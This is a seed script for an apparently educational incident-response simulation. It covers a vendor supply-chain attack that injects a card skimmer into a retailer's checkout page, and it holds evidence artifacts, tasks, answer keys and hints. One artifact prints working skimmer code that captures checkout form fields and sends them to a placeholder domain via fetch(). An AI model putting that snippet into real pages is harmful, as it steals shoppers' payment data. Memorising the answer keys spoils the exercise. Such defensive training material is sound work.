// Seeds Boss Fight simulation: SUPPLY-2026-001 — Magecart-Style Web Skimmer
// Supply-Chain Attack, inside the BrightCart Retail CompanyEnvironment (its
// second simulation, alongside the POS-malware-flavored RET-2026-005).
// Requires scripts/seed-companies.ts to have been run first.
//
// A third story shape: the compromise never touches BrightCart's own network
// at all. A third-party JS vendor's CI/CD pipeline was compromised, pushing
// a malicious script update that skims card data directly out of customer
// browsers during checkout. Tasks are written specifically for this story.
//
// Randomized: uses {{TOKEN}} placeholders substituted per-student by
// src/lib/incident-randomizer.ts.
//
// Idempotent — safe to run multiple times. Run: npx tsx scripts/seed-incident-supply-2026-001.ts

import { PrismaClient } from "@prisma/client";

const db = new PrismaClient();

const ARTIFACTS = [
  {
    order: 1,
    type: "FILE_LISTING" as const,
    tactic: "INITIAL_ACCESS" as const,
    title: "Third-Party Script Deployment Log",
    content: `Script: analytics.js (served from BrightCart's checkout pages via the
vendor's CDN, {{C2_DOMAIN}})
Version deployed {{ATTACK_DATE}} {{ATTACK_TIME}}: v4.7.2 → v4.7.3
Deployed by: vendor CI/CD pipeline (automated, no BrightCart approval step
required for point releases)
File size change: +2.1 KB (unusually large for a stated "minor bugfix"
release)`,
  },
  {
    order: 2,
    type: "FILE_LISTING" as const,
    tactic: null,
    title: "Injected Skimmer Code — Diff (v4.7.2 → v4.7.3)",
    content: `+ document.querySelector('#checkout-form').addEventListener('submit', function(e) {
+   const data = new FormData(e.target);
+   const payload = btoa(JSON.stringify(Object.fromEntries(data)));
+   fetch('https://{{C2_DOMAIN}}/collect?d=' + payload, { mode: 'no-cors' });
+ });

Assessment: this code silently captures every field in the checkout form
(name, card number, expiry, CVV, billing address) on submit and sends it,
base64-encoded, to an external domain — before the legitimate checkout
request is even processed.`,
  },
  {
    order: 3,
    type: "EVENT_LOG" as const,
    tactic: "COMMAND_AND_CONTROL" as const,
    title: "Content Security Policy Violation Reports",
    content: `{{ATTACK_DATE}}, first report at {{ATTACK_TIME}}
Violated Directive: connect-src
Blocked URI: https://{{C2_DOMAIN}}/collect
Document URI: https://brightcart-retail.com/checkout
Report Count: 3,412 reports across {{ATTACK_DATE}} and the following day
(only from browsers with a strict CSP configured — most customer browsers
had no CSP at all and silently allowed the connection)`,
  },
  {
    order: 4,
    type: "PCAP_SUMMARY" as const,
    tactic: "EXFILTRATION" as const,
    title: "Web Proxy Log — Skimmer Exfiltration Traffic",
    content: `Destination: {{C2_DOMAIN}} ({{C2_IP}})
Request Pattern: GET /collect?d=<base64> from checkout.brightcart-retail.com
sessions
Volume: matches checkout session volume for the affected window almost
exactly — consistent with the skimmer firing on every checkout, not a
sampled subset
Window: {{ATTACK_DATE}} {{ATTACK_TIME}} through the following 31 hours,
until the script was rolled back`,
  },
  {
    order: 5,
    type: "FILE_LISTING" as const,
    tactic: null,
    title: "Vendor Incident Notification",
    content: `From: Security Team, [Analytics Vendor]
Subject: Security Notice — Unauthorized Deployment via Compromised CI/CD Credentials

We are notifying customers that on {{ATTACK_DATE}}, an unauthorized version
of analytics.js (v4.7.3) was deployed to our CDN. Our investigation found
that a DevOps engineer's credentials were compromised via a phishing email
and used to push the release through our CI/CD pipeline, bypassing our
normal code review step (a known gap in our release process for point
releases). We have since revoked and rotated all deployment credentials and
added a mandatory review gate for every release, including patch versions.`,
  },
  {
    order: 6,
    type: "EVENT_LOG" as const,
    tactic: "IMPACT" as const,
    title: "Card Fraud Correlation Report",
    content: `Fraud team correlation of chargeback/fraud reports against checkout
session timestamps:

  Checkout sessions during the affected window: 18,340
  Sessions with subsequent confirmed card fraud reports: 612 (and rising)
  Common point of purchase: all 612 checked out on brightcart-retail.com
  during the window analytics.js v4.7.3 was live

Classification: Confirmed compromise of customer payment card data at
scale via the checkout page skimmer.`,
  },
  {
    order: 7,
    type: "DEFENDER_LOG" as const,
    tactic: null,
    title: "Web Application Firewall Alert",
    content: `Alert Time: {{ATTACK_TIME}} (same day as the first CSP violation reports)
Alert: "Anomalous outbound script behavior detected"
Resource: checkout.brightcart-retail.com
Detail: third-party script analytics.js observed initiating connections to
a domain not present in the previously approved outbound allowlist
({{C2_DOMAIN}})
Action Taken: Logged only — this WAF rule was in monitor mode, not
blocking mode.`,
  },
  {
    order: 8,
    type: "TIMELINE" as const,
    tactic: null,
    title: "Consolidated Incident Timeline",
    content: `{{ATTACK_DATE}} {{ATTACK_TIME}}  Vendor's DevOps engineer phished, CI/CD credentials stolen
Same day  Malicious analytics.js v4.7.3 deployed via the vendor's own pipeline, bypassing code review
Same day  Skimmer begins capturing checkout form data on every submit
Same day  First CSP violation reports and WAF alert fire (both in monitor-only mode, no automatic block)
+31 hours  Vendor's own security team detects the unauthorized deployment and notifies customers
+31 hours  BrightCart rolls back analytics.js to the last known-good version
Following days  Fraud team correlates 612+ card fraud reports back to the affected checkout window`,
  },
];

const NETWORK_NODES = [
  { id: "vendor-cicd", label: "Vendor CI/CD Pipeline", kind: "server", x: 10, y: 20 },
  { id: "cdn", label: "Analytics CDN (analytics.js)", kind: "server", x: 40, y: 20 },
  { id: "checkout", label: "BrightCart Checkout Page", kind: "server", x: 70, y: 20 },
  { id: "customers", label: "Customer Browsers", kind: "workstation", x: 70, y: 65 },
  { id: "skimmer-domain", label: "{{C2_DOMAIN}} (Skimmer Exfil)", kind: "internet", x: 95, y: 45 },
];

const NETWORK_EVENTS = [
  { triggerOrder: 1, nodeId: "cdn", status: "suspicious", note: "Unusual point-release deployed, larger than expected" },
  { triggerOrder: 2, nodeId: "vendor-cicd", status: "compromised", note: "Compromised pipeline pushed the malicious script update" },
  { triggerOrder: 2, nodeId: "cdn", status: "compromised", note: "Serving the malicious skimmer script version" },
  { triggerOrder: 3, nodeId: "skimmer-domain", status: "compromised", note: "Confirmed skimmer exfiltration destination" },
  { triggerOrder: 4, nodeId: "vendor-cicd", status: "compromised", note: "Root cause confirmed: phished DevOps engineer credentials" },
  { triggerOrder: 6, nodeId: "checkout", status: "compromised", note: "Confirmed executing the skimmer against real customers" },
  { triggerOrder: 6, nodeId: "customers", status: "suspicious", note: "Card data exfiltrated from checkout sessions during the compromised window" },
  { triggerOrder: 7, nodeId: "cdn", status: "contained", note: "Rolled back to the last known-good script version" },
  { triggerOrder: 7, nodeId: "skimmer-domain", status: "contained", note: "Blocked at the WAF/CDN edge" },
  { triggerOrder: 7, nodeId: "vendor-cicd", status: "contained", note: "Deployment credentials rotated, review gate added" },
  { triggerOrder: 7, nodeId: "checkout", status: "contained", note: "Verified clean script serving resumed" },
  { triggerOrder: 7, nodeId: "customers", status: "contained", note: "Affected customers notified per PCI requirements" },
];

const TASKS = [
  {
    order: 1,
    title: "Identify the Compromised Script",
    prompt: "Based on the deployment log, which third-party script was compromised?",
    answerType: "FREE_TEXT" as const,
    correctAnswer: "analytics.js",
    options: [] as string[],
    points: 120,
    hints: [
      { level: 1, pointCost: 20, text: "Check the deployment log artifact's Script field." },
      { level: 2, pointCost: 30, text: "The same filename appears again in the code diff artifact." },
      { level: 3, pointCost: 40, text: "It's the script named at the top of the deployment log." },
    ],
  },
  {
    order: 2,
    title: "Identify Initial Access",
    prompt: "How did this attack reach BrightCart's checkout page?",
    answerType: "RADIO" as const,
    correctAnswer: "Compromise of a third-party JavaScript vendor's CI/CD pipeline (a software supply-chain attack) — not a direct attack on BrightCart",
    options: [
      "Compromise of a third-party JavaScript vendor's CI/CD pipeline (a software supply-chain attack) — not a direct attack on BrightCart",
      "A phishing email sent directly to BrightCart employees",
      "Brute-force compromise of an internet-facing RDP service at BrightCart",
      "An insider at BrightCart intentionally added the skimmer code",
    ],
    points: 120,
    hints: [
      { level: 1, pointCost: 20, text: "Look at who actually deployed the malicious code, and through what pipeline." },
      { level: 2, pointCost: 30, text: "The deployment log and vendor notification both point to the same external party's pipeline." },
      { level: 3, pointCost: 40, text: "It's a supply-chain compromise of the vendor's pipeline, not anything internal to BrightCart." },
    ],
  },
  {
    order: 3,
    title: "Find the Skimmer Exfiltration Domain",
    prompt: "What domain did the skimmer send captured checkout data to?",
    answerType: "FREE_TEXT" as const,
    correctAnswer: "{{C2_DOMAIN}}",
    options: [],
    points: 140,
    hints: [
      { level: 1, pointCost: 20, text: "Check the injected code diff, the CSP violation reports, and the web proxy log — the same domain appears in all three." },
      { level: 2, pointCost: 30, text: "It's the domain in the fetch() call inside the injected code." },
      { level: 3, pointCost: 40, text: "It's the Blocked URI value from the CSP violation reports." },
    ],
  },
  {
    order: 4,
    title: "Identify How the Vendor Was Compromised",
    prompt: "According to the vendor's own incident notification, how did the attacker get into their deployment pipeline?",
    answerType: "RADIO" as const,
    correctAnswer: "A phished DevOps engineer's credentials were used to push the release through the vendor's CI/CD pipeline",
    options: [
      "A phished DevOps engineer's credentials were used to push the release through the vendor's CI/CD pipeline",
      "The vendor's CDN was directly hacked via a software vulnerability",
      "A vendor employee intentionally added the skimmer code",
      "BrightCart's own credentials were used to modify the vendor's script",
    ],
    points: 150,
    hints: [
      { level: 1, pointCost: 25, text: "Read the vendor incident notification artifact closely — it explains its own root cause." },
      { level: 2, pointCost: 35, text: "It names a phished DevOps engineer as the entry point into their own pipeline." },
      { level: 3, pointCost: 45, text: "It's the phished DevOps engineer's compromised credentials." },
    ],
  },
  {
    order: 5,
    title: "Map to MITRE ATT&CK",
    prompt: "Which MITRE ATT&CK technique best describes this attack overall?",
    answerType: "RADIO" as const,
    correctAnswer: "T1195.002 – Supply Chain Compromise: Compromise Software Supply Chain",
    options: [
      "T1195.002 – Supply Chain Compromise: Compromise Software Supply Chain",
      "T1189 – Drive-by Compromise",
      "T1566 – Phishing (against BrightCart directly)",
      "T1078 – Valid Accounts (Cloud)",
    ],
    points: 170,
    hints: [
      { level: 1, pointCost: 25, text: "The malicious code arrived through a legitimate, trusted software update channel." },
      { level: 2, pointCost: 35, text: "A trusted third-party component's build/release pipeline being compromised is the definition of this technique." },
      { level: 3, pointCost: 45, text: "It's software supply-chain compromise — T1195.002." },
    ],
  },
  {
    order: 6,
    title: "Design Detection Logic",
    prompt: "You need a detection rule to catch this kind of attack earlier next time. Which single condition should the detection primarily match on?",
    answerType: "RADIO" as const,
    correctAnswer: "A Content Security Policy violation report showing a new, unauthorized connect-src domain appearing across a large number of customer sessions simultaneously",
    options: [
      "A Content Security Policy violation report showing a new, unauthorized connect-src domain appearing across a large number of customer sessions simultaneously",
      "Any change to any third-party script, regardless of behavior",
      "The specific version number string used in the release",
      "The total file size of the checkout page in bytes",
    ],
    points: 170,
    hints: [
      { level: 1, pointCost: 25, text: "This incident already produced exactly this signal — it just wasn't acted on in real time." },
      { level: 2, pointCost: 35, text: "A sudden, widespread new outbound domain appearing in CSP reports is the actionable pattern." },
      { level: 3, pointCost: 45, text: "Detect on new connect-src domains appearing at scale in CSP violation reports." },
    ],
  },
  {
    order: 7,
    title: "Recommend Containment",
    prompt: "You've confirmed 612+ customers have had card data stolen via the skimmer. What's the correct immediate containment action?",
    answerType: "RADIO" as const,
    correctAnswer: "Roll back the third-party script to the last known-good version (or remove it entirely), block the exfiltration domain, and notify affected customers and your payment processor per PCI incident requirements",
    options: [
      "Roll back the third-party script to the last known-good version (or remove it entirely), block the exfiltration domain, and notify affected customers and your payment processor per PCI incident requirements",
      "Wait for the vendor to fix it on their own timeline before taking any local action",
      "Only change BrightCart's own admin passwords",
      "Take the entire storefront offline indefinitely without addressing the script",
    ],
    points: 190,
    hints: [
      { level: 1, pointCost: 25, text: "BrightCart doesn't have to wait on the vendor — the script can be pulled or rolled back locally." },
      { level: 2, pointCost: 35, text: "Fix the immediate exposure (the script and the exfil domain), then meet PCI notification obligations." },
      { level: 3, pointCost: 45, text: "Roll back/remove the script, block the exfil domain, and notify per PCI requirements." },
    ],
  },
  {
    order: 8,
    title: "Produce the Executive Summary",
    prompt: "Which sentence best captures the root cause for the executive summary of your incident report?",
    answerType: "RADIO" as const,
    correctAnswer: "A phished DevOps engineer at a third-party analytics vendor allowed a malicious script update through the vendor's CI/CD pipeline, injecting a card skimmer into BrightCart's checkout page that exfiltrated customer payment data at scale",
    options: [
      "A phished DevOps engineer at a third-party analytics vendor allowed a malicious script update through the vendor's CI/CD pipeline, injecting a card skimmer into BrightCart's checkout page that exfiltrated customer payment data at scale",
      "BrightCart's own POS terminals were infected with memory-scraping malware",
      "An insider at BrightCart intentionally leaked customer card data",
      "Ransomware encrypted BrightCart's e-commerce database",
    ],
    points: 210,
    hints: [
      { level: 1, pointCost: 30, text: "Trace the chain from the vendor's own incident notification through to the fraud correlation report." },
      { level: 2, pointCost: 40, text: "The root cause statement should name the vendor's compromised pipeline as entry and checkout-page card skimming as impact." },
      { level: 3, pointCost: 50, text: "Entry via the vendor's compromised CI/CD pipeline, impact is checkout-page card skimming — not POS malware, an insider, or ransomware." },
    ],
  },
];

async function main() {
  const company = await db.companyEnvironment.findUnique({ where: { slug: "brightcart-retail" } });
  if (!company) {
    throw new Error("Run scripts/seed-companies.ts first — brightcart-retail not found.");
  }

  const briefing =
    "BrightCart Retail's fraud team is seeing a spike in card-not-present fraud reports, all tracing back to " +
    "customers who checked out on the website during a specific window. Nothing on BrightCart's own network was " +
    "touched — the trail leads to a third-party script vendor. You are the lead investigator. Work through the " +
    "evidence below to reconstruct the full attack chain, then produce detection content, a containment " +
    "recommendation, and an executive summary.";

  const sim = await db.incidentSimulation.upsert({
    where: { slug: "supply-2026-001-web-skimmer" },
    update: {
      codename: "SUPPLY-2026-001",
      title: "Magecart-Style Web Skimmer Supply-Chain Attack",
      companyId: company.id,
      briefing,
      difficulty: "INSANE",
      estimatedMinutes: 170,
      points: 1260,
      published: true,
      randomized: true,
      isCapstone: true,
      networkNodes: NETWORK_NODES,
      networkEvents: NETWORK_EVENTS,
    },
    create: {
      slug: "supply-2026-001-web-skimmer",
      codename: "SUPPLY-2026-001",
      title: "Magecart-Style Web Skimmer Supply-Chain Attack",
      companyId: company.id,
      briefing,
      difficulty: "INSANE",
      estimatedMinutes: 170,
      points: 1260,
      published: true,
      randomized: true,
      isCapstone: true,
      networkNodes: NETWORK_NODES,
      networkEvents: NETWORK_EVENTS,
    },
  });

  await db.incidentSimArtifact.deleteMany({ where: { simulationId: sim.id } });
  await db.incidentSimArtifact.createMany({
    data: ARTIFACTS.map((a) => ({
      simulationId: sim.id,
      type: a.type,
      title: a.title,
      content: a.content,
      order: a.order,
      tactic: a.tactic,
    })),
  });

  await db.incidentSimTask.deleteMany({ where: { simulationId: sim.id } });
  for (const t of TASKS) {
    const task = await db.incidentSimTask.create({
      data: {
        simulationId: sim.id,
        order: t.order,
        title: t.title,
        prompt: t.prompt,
        answerType: t.answerType,
        correctAnswer: t.correctAnswer,
        options: t.options,
        points: t.points,
      },
    });
    await db.incidentSimHint.createMany({
      data: t.hints.map((h) => ({ taskId: task.id, level: h.level, pointCost: h.pointCost, text: h.text })),
    });
  }

  console.log(`✓ SUPPLY-2026-001 seeded: ${ARTIFACTS.length} artifacts, ${TASKS.length} tasks.`);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => db.$disconnect());
